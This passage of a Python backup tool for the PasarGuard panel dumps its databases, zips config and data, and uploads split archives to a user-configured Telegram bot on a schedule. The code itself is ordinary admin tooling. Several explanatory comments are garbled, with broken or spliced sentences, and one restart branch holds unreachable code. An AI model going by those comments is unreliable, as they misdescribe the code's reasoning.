        if scheme in ("socks5", "socks5h", "socks4", "socks4a"):
            if _pysocks is None:
                return False, "PySocks is required for SOCKS proxies but could not be installed"
            proxy_type = _pysocks.SOCKS4 if scheme.startswith("socks4") else _pysocks.SOCKS5
            rdns = scheme in ("socks5h", "socks4a")
            socks_ctx = _SocksProxySocket(proxy_type, host, port, user, pwd, rdns=rdns)
        elif scheme in ("http", "https"):
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            return False, f"Unsupported proxy scheme: '{scheme}' (use http://, socks5:// or socks4://)"
    if opener is None:
        opener = urllib.request.build_opener()

    try:
        if socks_ctx:
            with socks_ctx:
                with opener.open(req, timeout=60) as r:
                    return True, r.read().decode()
        else:
            with opener.open(req, timeout=60) as r:
                return True, r.read().decode()
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}: {e.read().decode()}"
    except Exception as e:
        return False, str(e)

def _parse_proxy_url(proxy):
    from urllib.parse import urlparse
    p = urlparse(proxy)
    return p.scheme.lower(), p.hostname, p.port, p.username, p.password

class _SocksProxySocket:
    def __init__(self, proxy_type, host, port, username=None, password=None, rdns=True):
        self.proxy_type = proxy_type
        self.host, self.port = host, port
        self.username, self.password = username, password
        self.rdns = rdns
        self._orig_socket = None

    def __enter__(self):
        self._orig_socket = socket.socket
        _pysocks.set_default_proxy(self.proxy_type, self.host, self.port,
                                    rdns=self.rdns, username=self.username, password=self.password)
        socket.socket = _pysocks.socksocket
        return self

    def __exit__(self, *exc):
        socket.socket = self._orig_socket
        return False

def ask_telegram_proxy():
    ans = input(f" {C.R2}> Use a proxy for Telegram upload? (y/n): {C.RESET}").strip().lower()
    if ans != "y":
        return None
    proxy = input(
        f" {C.R2}> Proxy address (e.g. http://127.0.0.1:10809 or socks5h://127.0.0.1:1080): {C.RESET}"
    ).strip()
    return proxy or None

# ── Telegram file size handling ───────────────────────────────
TELEGRAM_BOT_MAX_FILE_SIZE = 50 * 1024 * 1024
TELEGRAM_SAFE_CHUNK_SIZE   = 49 * 1024 * 1024

def _split_file_into_chunks(file_path, chunk_size=TELEGRAM_SAFE_CHUNK_SIZE):
    file_size = os.path.getsize(file_path)
    if file_size <= chunk_size:
        return {"needs_split": False, "chunks": [file_path],
                "original": file_path, "total_size": file_size}

    base_dir  = os.path.dirname(file_path)
    base_name = os.path.basename(file_path)
    total     = (file_size + chunk_size - 1) // chunk_size

    parts = []
    with open(file_path, "rb") as src:
        for i in range(1, total + 1):
            chunk_path = os.path.join(base_dir, f"{base_name}.{i:03d}")
            with open(chunk_path, "wb") as dst:
                written = 0
                while written < chunk_size:
                    buf = src.read(min(chunk_size - written, 1024 * 1024))
                    if not buf:
                        break
                    dst.write(buf)
                    written += len(buf)
            parts.append(chunk_path)

    return {"needs_split": True, "chunks": parts,
            "original": file_path, "total_size": file_size}


def send_telegram_backup_archive(file_path, caption, token, chat_id, proxy=None):
    if not os.path.exists(file_path):
        return False, "File not found"

    info     = _split_file_into_chunks(file_path)
    chunks   = info["chunks"]
    original = info["original"]
    total    = len(chunks)

    if info["needs_split"]:
        size_mb = info["total_size"] / 1024 / 1024
        print_warning(
            f"Backup is {size_mb:.1f} MB — exceeds Telegram Bot API's "
            f"50 MB limit. Splitting into {total} parts…"
        )

    try:
        for idx, chunk_path in enumerate(chunks, 1):
            chunk_mb = os.path.getsize(chunk_path) / 1024 / 1024
            if info["needs_split"]:
                base_name = os.path.basename(original)
                cap = (
                    f"{caption}\n"
                    f"\n"
                    f"Part {idx}/{total}  ({chunk_mb:.1f} MB)\n"
                    f"\n"
                    f"To rejoin all parts on the server:\n"
                    f"  cat '{base_name}.*' > '{base_name}'\n"
                    f"Then unzip normally."
                )
            else:
                cap = caption
            label = f"part {idx}/{total} " if info["needs_split"] else ""
            print_info(f"Uploading {label}({chunk_mb:.1f} MB)…")
            ok, details = send_telegram_file(token, chat_id, chunk_path, cap, proxy)
            if not ok:
                print_error(f"Upload failed: {details}")
                return False, details
            if info["needs_split"]:
                print_success(f"Part {idx}/{total} sent.")
            else:
                print_success("Sent.")
    finally:
        if info["needs_split"]:
            for chunk_path in chunks:
                if chunk_path != original:
                    try:
                        os.remove(chunk_path)
                    except Exception:
                        pass

    return True, "OK"


def _join_chunks_if_needed(zip_name):
    """If chunks matching `zip_name` (e.g. `backup.zip.001`, `.002`, ...)
    exist in the same directory, automatically concatenate them into
    `base` and return the joined path. Otherwise return `zip_name`
    unchanged. Handles both the base name and the first-chunk name as
    input. Returns None if chunks are incomplete (gaps in numbering)."""
    import re, glob

    base = zip_name
    m = re.match(r"^(.*)\.([0-9]{3})$", zip_name)
    if m:
        base = m.group(1)

    candidates = sorted(glob.glob(base + ".*"))
    parts = [c for c in candidates if re.search(r"\.[0-9]{3}$", c)]

    if len(parts) < 2:
        return base

    nums = sorted(int(re.search(r"\.([0-9]{3})$", p).group(1)) for p in parts)
    expected = list(range(1, len(parts) + 1))
    if nums != expected:
        missing = sorted(set(expected) - set(nums))
        print_error(f"Incomplete chunks: found {len(parts)}, missing {missing}")
        return None

    print_info(f"Detected {len(parts)} Telegram chunks. Joining into {C.BOLD}{base}{C.RESET}…")
    total_bytes = 0
    with open(base, "wb") as out:
        for p in parts:
            sz = os.path.getsize(p)
            print_info(f"  + {os.path.basename(p)} ({sz / 1024 / 1024:.1f} MB)")
            with open(p, "rb") as f:
                shutil.copyfileobj(f, out, length=1024 * 1024)
            total_bytes += sz

    print_success(f"Joined into {base} ({total_bytes / 1024 / 1024:.1f} MB total)")

    yn = input(
        f"  {C.R2}> Delete the {len(parts)} chunk files now that we have "
        f"the joined archive? (y/n): {C.RESET}"
    ).strip().lower()
    if yn == "y":
        for p in parts:
            try:
                os.remove(p)
            except Exception:
                pass
        print_success(f"Deleted {len(parts)} chunk files.")
    else:
        print_info("Chunks left on disk — delete them manually when no longer needed.")

    return base


# ── Backup scope selector ─────────────────────────────────────
def ask_backup_scope():
    print()
    print(f"  {C.R2}What do you want to back up?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard only{C.RESET}  "
          f"{C.R3}(/opt/pasarguard + DB + /var/lib/pasarguard){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard + PG-Node{C.RESET}  "
          f"{C.R3}(everything above + /opt/pg-node + /var/lib/pg-node){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1 or 2: {C.RESET}").strip()
        if choice in ("1", "2"):
            return choice == "2"
        print_error("Invalid choice. Enter 1 or 2.")

# ── Backup creation ───────────────────────────────────────────
def create_backup(include_node=True):
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Starting backup  scope: {C.BOLD}{scope_label}{C.RESET}")

    try:
        backend = _detect_backend_local()
    except Exception as e:
        print_warning(f"Backend auto-detection failed: {e} — assuming legacy postgres+pasarguard")
        backend = {
            "type": "postgresql", "host": "127.0.0.1", "port": 5432,
            "user": "pasarguard", "password": "", "dbname": "pasarguard",
            "container": None, "env": {}, "services": [], "sqlite_path": None,
        }
    print_info(
        f"Detected backend: {C.BOLD}{backend['type']}{C.RESET}  "
        f"db={backend['dbname']}  user={backend['user']}  "
        f"host={backend['host']}:{backend['port']}  "
        f"container={backend['container'] or '(none — sqlite)'}"
    )

    ts          = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    scope_tag   = "full" if include_node else "pg"
    backup_name = f"backup_{scope_tag}_{ts}"
    # v4.2.1 — was f"/tmp/{backup_name}" (world-readable 0755 while the
    # unencrypted dump + .env lived there). tempfile.mkdtemp gives us a
    # 0700 dir that only this process can read, and we always clean up
    # via shutil.rmtree(tmp_dir, ...) below.
    tmp_dir     = tempfile.mkdtemp(prefix=f"{backup_name}_")
    final_base  = os.path.join(os.getcwd(), backup_name)
    zip_path    = f"{final_base}.zip"

    db_dir        = os.path.join(tmp_dir, "db_dump")
    pg_data_dest  = os.path.join(tmp_dir, "pasarguard_data")
    node_opt_dest = os.path.join(tmp_dir, "pg_node_opt")
    node_data_dest= os.path.join(tmp_dir, "pg_node_data")

    try:
        os.makedirs(db_dir, exist_ok=True)

        print_info("Copying PasarGuard config files...")
        for fn in ("docker-compose.yml", ".env"):
            src = os.path.join(PASARGUARD_DIR, fn)
            if os.path.exists(src):
                shutil.copy(src, tmp_dir)

        if not _backup_database_local(backend, db_dir):
            print_error("Database backup failed. Aborting.")
            shutil.rmtree(tmp_dir, ignore_errors=True)
            return None

        if os.path.exists(PASARGUARD_DATA_DIR):
            print_info("Copying PasarGuard data directory...")
            shutil.copytree(PASARGUARD_DATA_DIR, pg_data_dest)
        else:
            print_warning(f"{PASARGUARD_DATA_DIR} not found — skipped")

        if include_node:
            if os.path.exists(PG_NODE_DIR):
                print_info("Copying PG-Node config (/opt/pg-node)...")
                shutil.copytree(PG_NODE_DIR, node_opt_dest)
            else:
                print_warning(f"{PG_NODE_DIR} not found — skipped")
            if os.path.exists(PG_NODE_DATA_DIR):
                print_info("Copying PG-Node data (/var/lib/pg-node)...")
                shutil.copytree(PG_NODE_DATA_DIR, node_data_dest)
            else:
                print_warning(f"{PG_NODE_DATA_DIR} not found — skipped")

        web_state = "/etc/idontPG-backup/web.json"
        if os.path.exists(web_state):
            shutil.copy2(web_state, os.path.join(tmp_dir, "idontpg_web_state.json"))

        print_info("Compressing archive...")
        # v4.2.1 — set a 0700 umask BEFORE make_archive so the .zip is
        # created with owner-only perms atomically. The previous
        # make_archive-then-chmod flow had a TOCTOU window where any
        # local user could read the .env (with DB passwords) before
        # chmod 0600 ran.
        old_umask = os.umask(0o077)
        try:
            shutil.make_archive(final_base, "zip", tmp_dir)
        finally:
            os.umask(old_umask)
        shutil.rmtree(tmp_dir, ignore_errors=True)

        # Belt-and-braces — explicitly chmod in case umask was overridden
        # by something else in the script.
        try:
            os.chmod(zip_path, 0o600)
        except Exception:
            pass

        print_success(f"Archive: {zip_path}")
        return zip_path

    except Exception as e:
        print_error(f"Backup failed: {e}")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return None

# ── Per-backend local backup dispatchers ──────────────────────
def _backup_database_local(backend, db_dir):
    t = backend["type"]
    if t in ("postgresql", "timescaledb"):
        return _backup_postgres_local(backend, db_dir)
    if t in ("mysql", "mariadb"):
        return _backup_mysql_local(backend, db_dir)
    if t == "sqlite":
        return _backup_sqlite_local(backend, db_dir)
    print_error(f"Unsupported backend type: '{t}'")
    return False

def _backup_postgres_local(backend, db_dir):
    svc = backend.get("container") or "postgres"
    user = backend["user"] or "pasarguard"

    # v4.2.2 — run ALL dumps first and collect their results, then write
    # the manifest ONLY if every dump (including globals) succeeded.
    # The previous order opened manifest.tsv for writing before any
    # pg_dump ran, and the dump's return code was ignored — so a fully
    # failed backup would still leave a "complete" manifest on disk.
    # The manifest is kept deterministic so backup consumers can process it safely.
    # to load the (empty) .sql files, producing the misleading
    # 'manifest.tsv not found or empty' error elsewhere because the
    # database export itself silently produced nothing.
    print_info("Exporting PostgreSQL globals (pg_dumpall)...")
    globals_ok = run_command(
        f"docker compose exec -T {shlex.quote(svc)} pg_dumpall -U {shlex.quote(user)} --globals-only",
        output_file=os.path.join(db_dir, "globals.sql"),
        cwd=PASARGUARD_DIR,
    )

    databases = _list_databases_local(svc)
    print_info(f"Found {len(databases)} Pasarguard database(s): {', '.join(databases)}")

    results = []  # list of (db, sql_file, has_ts, ts_ver, ok)
    for idx, db in enumerate(databases, 1):
        sql_file = f"db-{idx:03d}.sql"
        has_ts, ts_ver = _pg_db_timescale_info(svc, user, db)
        print_info(f"Exporting database {C.BOLD}{db}{C.RESET} → {sql_file}  (may take a while)")
        ok = run_command(
            f"docker compose exec -T {shlex.quote(svc)} pg_dump -U {shlex.quote(user)} "
            f"--clean --if-exists -d {shlex.quote(db)}",
            output_file=os.path.join(db_dir, sql_file),
            cwd=PASARGUARD_DIR,
        )
        results.append((db, sql_file, has_ts, ts_ver, ok))

    all_ok = globals_ok and all(r[4] for r in results)
    if not all_ok:
        failed = [r[0] for r in results if not r[4]]
        print_error(
            f"One or more database dumps failed "
            f"({', '.join(failed) if failed else 'globals'}); NOT writing manifest."
        )
        print_error("Re-run the backup once the underlying pg_dump / connection issue is fixed.")
        # Clean up the partial .sql files so they don't get picked up as a
        # incomplete backup artifacts from being mistaken for complete archives.
        for db, sql_file, _, _, ok in results:
            if not ok:
                try:
                    os.remove(os.path.join(db_dir, sql_file))
                except OSError:
                    pass
        if not globals_ok:
            try:
                os.remove(os.path.join(db_dir, "globals.sql"))
            except OSError:
                pass
        return False

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
        for db, sql_file, has_ts, ts_ver, _ in results:
            mf.write(f"{db}\t{user}\t{1 if has_ts else 0}\t{sql_file}\t{ts_ver}\n")

    print_success(f"Wrote manifest with {len(databases)} database entr{'y' if len(databases)==1 else 'ies'}.")
    return True

def _pg_db_timescale_info(svc, user, dbname):
    query = "SELECT extversion FROM pg_extension WHERE extname='timescaledb' LIMIT 1;"
    ok_v, out, _ = local_shell(
        f"docker compose exec -T {shlex.quote(svc)} psql -U {shlex.quote(user)} -d {shlex.quote(dbname)} "
        f"-tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v:
        return False, ""
    version = out.strip().splitlines()
    if version and version[0]:
        return True, version[0]
    return False, ""

def _backup_mysql_local(backend, db_dir):
    """Dump a single MySQL/MariaDB database (the official panel only uses
    one DB per install).

    v4.2 fix: MYSQL_PWD must be set *inside the container*, not on the host
    shell that runs `docker compose`. `docker compose exec` does not forward
    the host environment to the container unless told to with `-e`, so the
    previous `MYSQL_PWD=... docker compose exec ...` form silently had no
    effect and mysqldump would hang on / fail an interactive password
    prompt. Passing it via `exec -e` fixes that.

    v4.2.2 — try multiple credential candidates instead of one. Previously
    this function used only the user/password parsed out of
    SQLALCHEMY_DATABASE_URL (with a fallback to DB_USER/DB_PASSWORD in
    .env), and bailed on the first 1045 'Access denied'. That was
    asymmetric with _restore_mysql_local, which already iterates over
    (DB_USER,DB_PASSWORD) and (root,MYSQL_ROOT_PASSWORD). On installs
    where the panel's URL happens to carry one credential pair but the
    actual MySQL accepts a different one (very common — the panel
    normally uses `pasarguard/<DB_PASSWORD>` while root has
    `MYSQL_ROOT_PASSWORD`), the backup would fail and the user had no
    obvious fix short of editing the script. We now try all known pairs
    and stop at the first one that succeeds."""
    svc    = backend.get("container")
    dbname = backend["dbname"] or "pasarguard"

    if not svc:
        print_error("Could not identify the MySQL/MariaDB container — aborting.")
        return False

    # Build the candidate credential list. Order matters: prefer the creds
    # the panel itself uses (so the dump captures the same data the panel
    # sees), then fall back to whatever else is in .env.
    env      = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    url_user = backend["user"] or ""
    url_pwd  = backend["password"] or ""
    db_user  = env.get("DB_USER", "") or ""
    db_pwd   = env.get("DB_PASSWORD", "") or ""
    root_pwd = env.get("MYSQL_ROOT_PASSWORD", "") or ""

    candidates = []
    for cu, cp in ((url_user, url_pwd),
                   (db_user,  db_pwd),
                   ("root",   root_pwd)):
        if cu and cp and (cu, cp) not in candidates:
            candidates.append((cu, cp))
    if not candidates:
        # Last resort: try root with no password (some local dev setups).
        candidates.append(("root", ""))

    sql_file = "db-001.sql"
    out_path = os.path.join(db_dir, sql_file)

    last_err = ""
    for cred_user, cred_pwd in candidates:
        env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
        print_info(
            f"Exporting {backend['type']} database {C.BOLD}{dbname}{C.RESET} → {sql_file}  "
            f"(as user '{cred_user}')  (may take a while)"
        )
        # Run silently — we'll surface the LAST error only if every
        # candidate fails, so the user sees one clean diagnosis instead of
        # a wall of red.
        try:
            with open(out_path, "w") as _f:
                # v4.2.2 — added --databases (== -B). Without it mysqldump
                # writes only CREATE TABLE statements; downstream consumers can
                # target database doesn't exist yet (fresh MySQL on a new
                # server) and every statement blows up with "No database
                # selected". --databases prepends CREATE DATABASE and USE,
                # so the dump remains self-contained.
                subprocess.run(
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysqldump "
                    f"--databases --single-transaction --quick --triggers "
                    f"--events --routines --hex-blob --default-character-set=utf8mb4 "
                    f"{shlex.quote(dbname)}",
                    shell=True, check=True, stdout=_f,
                    stderr=subprocess.PIPE, cwd=PASARGUARD_DIR,
                )
            # Dump succeeded.
            manifest_path = os.path.join(db_dir, "manifest.tsv")
            with open(manifest_path, "w") as mf:
                mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
                mf.write(f"{dbname}\t{cred_user}\t0\t{sql_file}\t\n")
            print_success(
                f"Wrote manifest for {backend['type']} database '{dbname}' "
                f"(dump produced via user '{cred_user}')."
            )
            return True
        except subprocess.CalledProcessError as e:
            err = e.stderr.decode("utf-8", errors="replace").strip() if e.stderr else ""
            # Trim the noisy mysqldump banner to the first useful line.
            first_line = next((ln for ln in err.splitlines() if ln.strip()), err)
            print_warning(f"  mysqldump as '{cred_user}' failed: {first_line}")
            last_err = err

    print_error(
        f"All {len(candidates)} credential combination(s) failed for MySQL/MariaDB dump."
    )
    if last_err:
        print_error(f"Last mysqldump error:\n{last_err}")
    print_error(
        "Check DB_USER/DB_PASSWORD and MYSQL_ROOT_PASSWORD in /opt/pasarguard/.env,"
    )
    print_error(
        "and confirm one of those users can read the '{0}' database inside the '{svc}' container."
        .format(dbname, svc=svc)
    )
    return False

def _backup_sqlite_local(backend, db_dir):
    candidates = []
    if backend.get("sqlite_path"):
        candidates.append(backend["sqlite_path"])
    candidates += [
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite3"),
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite"),
    ]
    src = next((c for c in candidates if os.path.exists(c)), None)
    if not src:
        print_error(f"No SQLite database file found (tried: {', '.join(candidates)})")
        return False

    dst_name = os.path.basename(src)
    print_info(f"Copying SQLite database {src} → db_dump/{dst_name}")
    shutil.copy2(src, os.path.join(db_dir, dst_name))

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write("# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type=sqlite\n")
        mf.write(f"{os.path.splitext(dst_name)[0]}\tpasarguard\t0\t{dst_name}\t\n")
    print_success("Wrote manifest for SQLite database.")
    return True

# ── Workflow 2: Scheduled Telegram backup ────────────────────
def run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy=None, instance=None):
    interval_s  = int(interval_h * 3600)
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Scheduler started  scope: {C.BOLD}{scope_label}{C.RESET}  every {interval_h}h")
    print_warning("Press Ctrl+C to stop.")
    print(hline())

    try:
        while True:
            now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write_state(instance, "backing_up", now_str)
            print(f"\n  {C.R2}[..]{C.RESET}  {C.WH}Starting scheduled backup at {now_str}...{C.RESET}")

            zip_path = create_backup(include_node)
            if zip_path and os.path.exists(zip_path):
                print_info("Uploading to Telegram...")
                cap = (f"PasarGuard {'+ PG-Node ' if include_node else ''}Auto Backup\n"
                       f"Date: {now_str}\nInterval: {interval_h}h\ndurwinam")
                success, details = send_telegram_backup_archive(zip_path, cap, bot_token, admin_id, proxy)
                if success: print_success("Backup sent to Telegram!")
                else:       print_error(f"Send failed: {details}")
                # Keep the archive locally so the Web Panel can expose
                # the latest Telegram backup with direct download/delete actions.
                if success:
                    try:
                        os.chmod(zip_path, 0o600)
                    except OSError:
                        pass
                    print_info("Local archive retained for Web Panel management.")
            else:
                print_error("Backup failed — skipping upload.")

            next_run = datetime.datetime.now() + datetime.timedelta(seconds=interval_s)
            write_state(instance, "sleeping", next_run.strftime("%Y-%m-%d %H:%M:%S"))
            print_info(f"Sleeping {interval_h}h... (next backup at {next_run.strftime('%Y-%m-%d %H:%M:%S')})")
            time.sleep(interval_s)

    except KeyboardInterrupt:
        write_state(instance, "stopped", "")
        print(f"\n  {C.R2}Scheduler stopped.{C.RESET}")

def workflow_backup_bot():
    print_header("Auto Backup to Telegram Bot (Scheduled)")

    include_node = ask_backup_scope()

    bot_token = input(f"  {C.R2}> Bot Token: {C.RESET}").strip()
    while not bot_token:
        bot_token = input(f"  {C.R1}Cannot be empty!{C.RESET}  {C.R2}> Bot Token: {C.RESET}").strip()

    admin_id = input(f"  {C.R2}> Admin Chat ID (numeric): {C.RESET}").strip()
    while not admin_id or not admin_id.lstrip("-").isdigit():
        admin_id = input(f"  {C.R1}Invalid!{C.RESET}  {C.R2}> Admin Chat ID: {C.RESET}").strip()

    proxy = ask_telegram_proxy()

    try:
        interval_h = float(input(f"  {C.R2}> Interval in hours (e.g. 1, 0.5): {C.RESET}").strip())
    except ValueError:
        print_warning("Invalid number. Defaulting to 1.0 hour.")
        interval_h = 1.0

    mode = ask_persistence_mode()

    if mode == "1":
        run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy)
        return

    kind_by_mode = {"2": "screen", "3": "tmux", "4": "systemd"}
    kind = kind_by_mode[mode]

    instance_name = ask_instance_name(kind)

    # v4.2: token/chat/proxy go to a 0600 credentials file instead of into
    # the daemon's CLI args (which would otherwise leak via `ps`,
    # /proc/<pid>/cmdline, and the systemd unit file). interval/include_node
    # are stored alongside them so 'Manage Backup Schedulers' can later
    # restart this exact instance or update its token without re-asking.
    write_daemon_creds(instance_name, bot_token, admin_id, proxy,
                        interval_h=interval_h, include_node=include_node)
    daemon_cmd = build_daemon_command(interval_h, include_node, instance=instance_name)

    if mode == "2":
        launch_via_screen(daemon_cmd, session_name=instance_name)
    elif mode == "3":
        launch_via_tmux(daemon_cmd, session_name=instance_name)
    elif mode == "4":
        launch_via_systemd(daemon_cmd, unit_name=instance_name)

# ── Workflow 3: Manual local backup ──────────────────────────
def workflow_manual_backup():
    print_header("Manual Backup (Local)")

    include_node = ask_backup_scope()
    zip_path = create_backup(include_node)
    if zip_path and os.path.exists(zip_path):
        print_success(f"Backup saved: {zip_path}")
    else:
        print_error("Manual backup failed!")

# ── Workflow 5: Manage running/installed schedulers ───────────
def _systemctl_action(unit_name, action, quiet=False):
    # v4.2.1 — unit_name flows into a shell=True command. Strict validation
    # plus shlex.quote so neither typos nor upstream output quirks can
    # inject extra arguments to systemctl.
    _validate_instance_name(unit_name)
    return run_command(f"systemctl {action} {shlex.quote(unit_name)}.service", quiet=quiet)

def _format_remaining(target_str):
    try:
        target = datetime.datetime.strptime(target_str, "%Y-%m-%d %H:%M:%S")
    except Exception:
        return target_str
    remaining = (target - datetime.datetime.now()).total_seconds()
    if remaining <= 0:
        return "now"
    total_min = int(remaining // 60)
    h, m = divmod(total_min, 60)
    if h > 0 and m > 0:
        return f"{h}h {m}m"
    if h > 0:
        return f"{h}h"
    if m > 0:
        return f"{m}m"
    return "<1m"

def workflow_manage_schedulers():
    print_header("Manage Backup Schedulers")

    items = []
    for suffix, name, active in list_systemd_backup_units():
        items.append(("systemd", name, active))
    for name in list_screen_sessions():
        items.append(("screen", name, True))
    for name in list_tmux_sessions():
        items.append(("tmux", name, True))

    if not items:
        print_warning("No scheduler instances found (systemd service / screen / tmux session).")
        print_info("Create one from 'Auto Backup to Telegram Bot (Scheduled)' first.")
        return

    print(f"  {C.R2}Scheduler instances found:{C.RESET}\n")
    for i, (kind, name, active) in enumerate(items, 1):
        status = f"{C.R1}RUNNING{C.RESET}" if active else f"{C.R3}STOPPED{C.RESET}"
        phase_note = ""
        st = read_state(name)
        if st:
            phase, extra, age = st
            if phase == "backing_up" and age < 3600:
                phase_note = f"  {C.R1}(backing up now){C.RESET}"
            elif phase == "sleeping" and extra:
                phase_note = f"  {C.R3}(sleeping — {_format_remaining(extra)} until next backup){C.RESET}"
            elif phase == "stopped":
                phase_note = f"  {C.R3}(stopped by Ctrl+C){C.RESET}"
        print(f"  {C.R1}{i}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}[{kind:<7}] {name}{C.RESET}   {status}{phase_note}")
    print()

    choice = input(f"  {C.R2}> Select a number to manage (ENTER to cancel): {C.RESET}").strip()
    if not choice:
        return
    try:
        idx = int(choice) - 1
        if idx < 0:
            raise ValueError
        kind, name, active = items[idx]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return

    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Restart (pick up latest script update){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Stop{C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Remove completely{C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Update Bot Token / Admin Chat ID{C.RESET}")
    print(f"  {C.R1}5{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Cancel{C.RESET}")
    print()
    act = input(f"  {C.R2}> Choose action for '{name}' (1-5): {C.RESET}").strip()

    if act == "1":
        _restart_scheduler_instance(kind, name)

    elif act == "2":
        if kind == "systemd":
            if _systemctl_action(name, "stop"):
                print_success(f"'{name}' stopped (still installed — start it again anytime).")
            else:
                print_error(f"Failed to stop '{name}'.")
        elif kind == "screen":
            # v4.2.1 — name comes from `screen -list` regex, but defend
            # against any name that smuggles shell metachars in.
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"screen -S {shlex.quote(name)} -X quit"):
                print_success(f"Screen session '{name}' stopped.")
            else:
                print_error("Failed to stop the screen session.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"tmux kill-session -t {shlex.quote(name)}"):
                print_success(f"Tmux session '{name}' stopped.")
            else:
                print_error("Failed to stop the tmux session.")

    elif act == "3":
        confirm = input(
            f"  {C.R1}> This will permanently remove '{name}'. Confirm? (y/n): {C.RESET}"
        ).strip().lower()
        if confirm != "y":
            print_warning("Aborted.")
            return
        if kind == "systemd":
            _systemctl_action(name, "stop", quiet=True)
            _systemctl_action(name, "disable", quiet=True)
            unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
            try:
                if os.path.exists(unit_path):
                    os.remove(unit_path)
                run_command("systemctl daemon-reload", quiet=True)
                # Clean up the credentials file too, since it holds the bot token.
                creds_path = _creds_path(name)
                if os.path.exists(creds_path):
                    os.remove(creds_path)
                print_success(f"Removed systemd scheduler '{name}'.")
            except Exception as e:
                print_error(f"Failed to remove unit file: {e}")
        elif kind == "screen":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"screen -S {shlex.quote(name)} -X quit", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed screen scheduler '{name}'.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"tmux kill-session -t {shlex.quote(name)}", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed tmux scheduler '{name}'.")

    elif act == "4":
        _update_scheduler_credentials(kind, name)

    else:
        print_warning("Cancelled.")

def _restart_scheduler_instance(kind, name):
    """Restart a scheduler instance so it picks up the latest code from
    'Update to Latest Version', without deleting and recreating it.

    - systemd: ExecStart already points at the on-disk script path, so a
      plain `systemctl restart` re-execs the process against whatever code
      is currently on disk — that alone is enough to pick up an update.
    - screen/tmux: the running process is a live Python interpreter that
      already loaded the old code into memory, so a restart has to kill the
      session and spawn a fresh one. We rebuild the exact daemon command
      from the stored credentials/meta file (token/chat/proxy/interval/
      scope) so the user doesn't have to re-enter anything."""
    if kind == "systemd":
        if _systemctl_action(name, "restart"):
            print_success(f"'{name}' restarted and is now running the latest script version.")
        else:
            print_error(f"Failed to restart '{name}'.")
        return

    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials/config found for '{name}' — cannot rebuild it.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    daemon_cmd = build_daemon_command(meta["interval"], meta["node"], instance=name)
    # v4.2.1 — validate + quote before any shell=True use.
    try:
        _validate_instance_name(name)
    except ValueError as e:
        print_error(f"Refusing to act on unsafe session name: {e}")
        return
    q = shlex.quote(name)

    if kind == "screen":
        run_command(f"screen -S {q} -X quit", quiet=True)
        if run_command(f"screen -dmS {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh screen session — now running the latest script version.")
        else:
            print_error(f"Failed to restart screen session '{name}'.")
    elif kind == "tmux":
        run_command(f"tmux kill-session -t {q}", quiet=True)
        if run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh tmux session — now running the latest script version.")
        else:
            print_error(f"Failed to restart tmux session '{name}'.")

def _update_scheduler_credentials(kind, name):
    """Let the user change a running scheduler's bot token and/or admin
    chat ID without deleting and recreating the whole instance. Updates the
    0600 credentials file, then restarts the instance so the change takes
    effect immediately (same restart logic as option 1)."""
    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
